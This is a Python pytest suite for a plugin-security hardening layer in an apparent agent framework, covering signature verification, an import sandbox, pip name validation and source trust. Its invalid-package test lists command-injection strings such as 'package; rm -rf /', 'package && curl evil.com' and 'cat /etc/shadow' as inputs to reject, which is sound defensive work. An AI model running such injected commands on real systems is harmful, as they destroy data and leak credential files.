"""Tests for plugin system security hardening (CRIT-2)."""
from __future__ import annotations

import base64
import json
import os
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

# Ensure project root is importable
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from saido_agent.plugins.types import (
    DependencyPin,
    PluginManifest,
    PluginSecurityError,
    VALID_PERMISSIONS,
)
from saido_agent.plugins.sandbox import (
    BLOCKED_MODULES,
    DEFAULT_ALLOWED_MODULES,
    _is_module_blocked,
    sandboxed_import_plugin_module,
)
from saido_agent.plugins.verify import (
    classify_source,
    is_trusted_source,
    sign_manifest,
    verify_manifest_signature,
)
from saido_agent.plugins.store import validate_pip_package_name


# ── Helpers ──────────────────────────────────────────────────────────────────

def _generate_test_keypair():
    """Generate an Ed25519 keypair for testing."""
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    from cryptography.hazmat.primitives import serialization

    private_key = Ed25519PrivateKey.generate()
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return private_pem, public_pem


def _make_manifest(**overrides) -> PluginManifest:
    """Create a test manifest with sensible defaults."""
    defaults = {
        "name": "test-plugin",
        "version": "1.0.0",
        "description": "A test plugin",
        "author": "Test Author",
    }
    defaults.update(overrides)
    return PluginManifest.from_dict(defaults)


def _make_plugin_entry(plugin_dir: Path, manifest: PluginManifest | None = None):
    """Create a PluginEntry for testing."""
    from saido_agent.plugins.types import PluginEntry, PluginScope
    return PluginEntry(
        name="test_plugin",
        scope=PluginScope.USER,
        source="test",
        install_dir=plugin_dir,
        enabled=True,
        manifest=manifest or _make_manifest(),
    )


# ═══════════════════════════════════════════════════════════════════════════════
# 1. Signature Verification Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestSignatureVerification:
    """Test Ed25519 manifest signature verification."""

    def test_unsigned_plugin_returns_false(self):
        """Unsigned plugins (no signature field) should return False from verify."""
        manifest = _make_manifest()
        assert manifest.signature == ""
        result = verify_manifest_signature(manifest)
        assert result is False

    def test_valid_signature_passes(self):
        """A correctly signed manifest should verify successfully."""
        private_pem, public_pem = _generate_test_keypair()
        manifest = _make_manifest()

        # Sign the manifest
        signature = sign_manifest(manifest, private_pem)
        manifest.signature = signature

        # Patch the public key loading to use our test key
        with patch("saido_agent.plugins.verify._load_public_key") as mock_load:
            from cryptography.hazmat.primitives.serialization import load_pem_public_key
            mock_load.return_value = load_pem_public_key(public_pem)
            assert verify_manifest_signature(manifest) is True

    def test_tampered_manifest_fails(self):
        """A manifest modified after signing should fail verification."""
        private_pem, public_pem = _generate_test_keypair()
        manifest = _make_manifest()

        signature = sign_manifest(manifest, private_pem)
        manifest.signature = signature

        # Tamper with the manifest
        manifest.description = "TAMPERED DESCRIPTION"

        with patch("saido_agent.plugins.verify._load_public_key") as mock_load:
            from cryptography.hazmat.primitives.serialization import load_pem_public_key
            mock_load.return_value = load_pem_public_key(public_pem)
            with pytest.raises(PluginSecurityError, match="signature verification FAILED"):
                verify_manifest_signature(manifest)

    def test_malformed_signature_raises(self):
        """A manifest with invalid base64 signature should raise."""
        manifest = _make_manifest()
        manifest.signature = "not-valid-base64!!!"
        with pytest.raises(PluginSecurityError, match="malformed signature"):
            verify_manifest_signature(manifest)

    def test_wrong_key_fails(self):
        """Signature from a different key should fail verification."""
        private_pem_a, _ = _generate_test_keypair()
        _, public_pem_b = _generate_test_keypair()

        manifest = _make_manifest()
        signature = sign_manifest(manifest, private_pem_a)
        manifest.signature = signature

        with patch("saido_agent.plugins.verify._load_public_key") as mock_load:
            from cryptography.hazmat.primitives.serialization import load_pem_public_key
            mock_load.return_value = load_pem_public_key(public_pem_b)
            with pytest.raises(PluginSecurityError, match="signature verification FAILED"):
                verify_manifest_signature(manifest)

    def test_unsigned_plugin_triggers_approval_on_install(self):
        """Installing an unsigned plugin without approval_callback should fail."""
        from saido_agent.plugins.store import install_plugin

        with tempfile.TemporaryDirectory() as tmpdir:
            plugin_dir = Path(tmpdir) / "my_plugin"
            plugin_dir.mkdir()
            # Create unsigned manifest
            (plugin_dir / "plugin.json").write_text(json.dumps({
                "name": "my_plugin",
                "version": "1.0.0",
            }))

            # Install without approval callback -> should be rejected
            # We need to also handle source verification for local path
            success, msg = install_plugin(
                f"my_plugin@{plugin_dir}",
                approval_callback=None,
            )
            assert not success
            assert "rejected" in msg.lower() or "approval" in msg.lower()

    def test_unsigned_plugin_approved_with_callback(self):
        """Installing an unsigned plugin with approval should succeed."""
        from saido_agent.plugins.store import install_plugin

        with tempfile.TemporaryDirectory() as tmpdir:
            plugin_src = Path(tmpdir) / "src" / "my_plugin"
            plugin_src.mkdir(parents=True)
            (plugin_src / "plugin.json").write_text(json.dumps({
                "name": "my_plugin",
                "version": "1.0.0",
            }))

            # Patch the plugin dir to use temp dir
            install_dir = Path(tmpdir) / "installed"
            install_dir.mkdir()

            with patch("saido_agent.plugins.store._plugin_dir_for", return_value=install_dir):
                with patch("saido_agent.plugins.store._save_entry"):
                    success, msg = install_plugin(
                        f"my_plugin@{plugin_src}",
                        approval_callback=lambda prompt: True,
                    )
                    assert success, msg


# ═══════════════════════════════════════════════════════════════════════════════
# 2. Sandbox / Restricted Imports Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestSandboxImports:
    """Test that the import sandbox blocks dangerous modules."""

    def test_blocked_modules_list(self):
        """Verify the blocked modules list contains critical dangerous modules."""
        for mod in ["os", "subprocess", "shutil", "socket", "http", "urllib", "ctypes"]:
            assert mod in BLOCKED_MODULES, f"{mod} should be in BLOCKED_MODULES"

    def test_os_is_blocked(self):
        """Direct 'os' import should be blocked."""
        assert _is_module_blocked("os", frozenset()) is True

    def test_os_path_is_blocked(self):
        """'os.path' should also be blocked (submodule of 'os')."""
        assert _is_module_blocked("os.path", frozenset()) is True

    def test_subprocess_is_blocked(self):
        assert _is_module_blocked("subprocess", frozenset()) is True

    def test_http_client_is_blocked(self):
        assert _is_module_blocked("http.client", frozenset()) is True

    def test_json_is_not_blocked(self):
        assert _is_module_blocked("json", frozenset()) is False

    def test_re_is_not_blocked(self):
        assert _is_module_blocked("re", frozenset()) is False

    def test_math_is_not_blocked(self):
        assert _is_module_blocked("math", frozenset()) is False

    def test_allowed_extras_override_block(self):
        """If a module is declared in allowed_imports, it should NOT be blocked."""
        assert _is_module_blocked("os", frozenset({"os"})) is False
        assert _is_module_blocked("subprocess", frozenset({"subprocess"})) is False

    def test_sandboxed_import_blocks_os(self):
        """A plugin module that imports os should raise PluginSecurityError."""
        with tempfile.TemporaryDirectory() as tmpdir:
            plugin_dir = Path(tmpdir)
            # Write a plugin module that imports os
            (plugin_dir / "bad_module.py").write_text("import os\nresult = os.getcwd()\n")

            manifest = _make_manifest()
            entry = _make_plugin_entry(plugin_dir, manifest)
            entry.name = "bad_test_plugin"

            with pytest.raises(PluginSecurityError, match="blocked module 'os'"):
                sandboxed_import_plugin_module(entry, "bad_module")

    def test_sandboxed_import_allows_json(self):
        """A plugin module that imports json should load fine."""
        with tempfile.TemporaryDirectory() as tmpdir:
            plugin_dir = Path(tmpdir)
            (plugin_dir / "good_module.py").write_text(
                "import json\nTOOL_SCHEMAS = [{'name': 'test'}]\n"
            )

            manifest = _make_manifest()
            entry = _make_plugin_entry(plugin_dir, manifest)
            entry.name = "good_test_plugin"

            mod = sandboxed_import_plugin_module(entry, "good_module")
            assert mod is not None
            assert hasattr(mod, "TOOL_SCHEMAS")

    def test_sandboxed_import_blocks_subprocess(self):
        """A plugin trying to import subprocess should be blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            plugin_dir = Path(tmpdir)
            (plugin_dir / "shell_module.py").write_text(
                "import subprocess\nsubprocess.run(['ls'])\n"
            )

            manifest = _make_manifest()
            entry = _make_plugin_entry(plugin_dir, manifest)
            entry.name = "shell_test_plugin"

            with pytest.raises(PluginSecurityError, match="blocked module 'subprocess'"):
                sandboxed_import_plugin_module(entry, "shell_module")


# ═══════════════════════════════════════════════════════════════════════════════
# 3. Pip Dependency Validation Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestPipValidation:
    """Test pip package name validation and hash pinning."""

    def test_valid_package_names(self):
        """Normal package names should pass validation."""
        valid_names = [
            "requests",
            "flask",
            "my-package",
            "my_package",
            "package123",
            "my.package",
            "requests>=2.0",
            "flask==2.3.1",
        ]
        for name in valid_names:
            assert validate_pip_package_name(name), f"'{name}' should be valid"

    def test_invalid_package_names(self):
        """Malicious or malformed package names should fail validation."""
        invalid_names = [
            "",
            "../../etc/passwd",
            "package; rm -rf /",
            "package && curl evil.com",
            "package | cat /etc/shadow",
            "-e git+https://evil.com/repo.git",
            "--index-url https://evil.com/simple",
            "package\nmalicious",
            "$HOME",
        ]
        for name in invalid_names:
            assert not validate_pip_package_name(name), f"'{name}' should be INVALID"

    def test_dependency_pin_valid(self):
        """A properly formatted DependencyPin should construct successfully."""
        pin = DependencyPin(
            package="requests",
            sha256="a" * 64,
        )
        assert pin.package == "requests"
        assert pin.sha256 == "a" * 64

    def test_dependency_pin_invalid_package(self):
        """DependencyPin with invalid package name should raise."""
        with pytest.raises(PluginSecurityError, match="Invalid pip package name"):
            DependencyPin(package="../../evil", sha256="a" * 64)

    def test_dependency_pin_invalid_hash(self):
        """DependencyPin with invalid hash should raise."""
        with pytest.raises(PluginSecurityError, match="Invalid sha256 hash"):
            DependencyPin(package="requests", sha256="not-a-valid-hash")

    def test_dependency_pin_from_str(self):
        """Parsing 'package:sha256' format should work."""
        pin = DependencyPin.from_str(f"requests:{'ab' * 32}")
        assert pin.package == "requests"
        assert pin.sha256 == "ab" * 32

    def test_dependency_pin_from_str_no_hash(self):
        """Parsing a string without hash should raise."""
        with pytest.raises(PluginSecurityError, match="must include sha256 hash"):
            DependencyPin.from_str("requests")

    def test_manifest_pinned_dependencies_parsed(self):
        """Manifest from_dict should parse pinned_dependencies correctly."""
        manifest = PluginManifest.from_dict({
            "name": "test",
            "pinned_dependencies": [
                {"package": "requests", "sha256": "a" * 64},
            ],
        })
        assert len(manifest.pinned_dependencies) == 1
        assert manifest.pinned_dependencies[0].package == "requests"


# ═══════════════════════════════════════════════════════════════════════════════
# 4. Source Verification Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestSourceVerification:
    """Test plugin source trust classification."""

    def test_trusted_registry(self):
        assert is_trusted_source("https://github.com/saido-agent-plugins/git-tools")
        assert is_trusted_source("https://github.com/saido-labs/core-plugin")

    def test_untrusted_registry(self):
        assert not is_trusted_source("https://github.com/random-user/evil-plugin")
        assert not is_trusted_source("https://evil.com/plugin.git")

    def test_classify_trusted_git(self):
        assert classify_source("https://github.com/saido-agent-plugins/foo") == "trusted"

    def test_classify_untrusted_git(self):
        assert classify_source("https://github.com/random/plugin") == "untrusted_git"

    def test_classify_local_path(self):
        assert classify_source("/home/user/my-plugin") == "local_path"
        assert classify_source("./my-plugin") == "local_path"

    def test_custom_trusted_registries(self):
        custom = ["https://gitlab.com/myorg/"]
        assert is_trusted_source("https://gitlab.com/myorg/plugin", custom)
        assert not is_trusted_source("https://github.com/saido-agent-plugins/foo", custom)


# ═══════════════════════════════════════════════════════════════════════════════
# 5. Permissions Display Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestPermissionsDisplay:
    """Test plugin permissions display."""

    def test_no_permissions(self):
        manifest = _make_manifest()
        display = manifest.format_permissions_display()
        assert "no permissions declared" in display

    def test_permissions_displayed(self):
        manifest = _make_manifest(permissions=["file_read", "network", "shell"])
        display = manifest.format_permissions_display()
        assert "File Read" in display
        assert "Network" in display
        assert "Shell" in display

    def test_invalid_permission_rejected(self):
        with pytest.raises(PluginSecurityError, match="Unknown permission"):
            _make_manifest(permissions=["file_read", "hack_the_planet"])

    def test_all_valid_permissions(self):
        """All defined permissions should be accepted."""
        manifest = _make_manifest(permissions=list(VALID_PERMISSIONS))
        assert len(manifest.permissions) == len(VALID_PERMISSIONS)

    def test_permissions_in_display_have_descriptions(self):
        """Each permission category should have a human-readable description."""
        for perm in VALID_PERMISSIONS:
            manifest = _make_manifest(permissions=[perm])
            display = manifest.format_permissions_display()
            assert "-" in display  # Each line has "Category - Description"


# ═══════════════════════════════════════════════════════════════════════════════
# 6. Canonical Manifest Serialization Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestCanonicalBytes:
    """Test that canonical_bytes is deterministic and excludes signature."""

    def test_deterministic(self):
        m1 = _make_manifest(tags=["b", "a"])
        m2 = _make_manifest(tags=["a", "b"])
        assert m1.canonical_bytes() == m2.canonical_bytes()

    def test_excludes_signature(self):
        m1 = _make_manifest()
        m2 = _make_manifest()
        m2.signature = "some-signature"
        assert m1.canonical_bytes() == m2.canonical_bytes()

    def test_different_content_different_bytes(self):
        m1 = _make_manifest(description="original")
        m2 = _make_manifest(description="modified")
        assert m1.canonical_bytes() != m2.canonical_bytes()
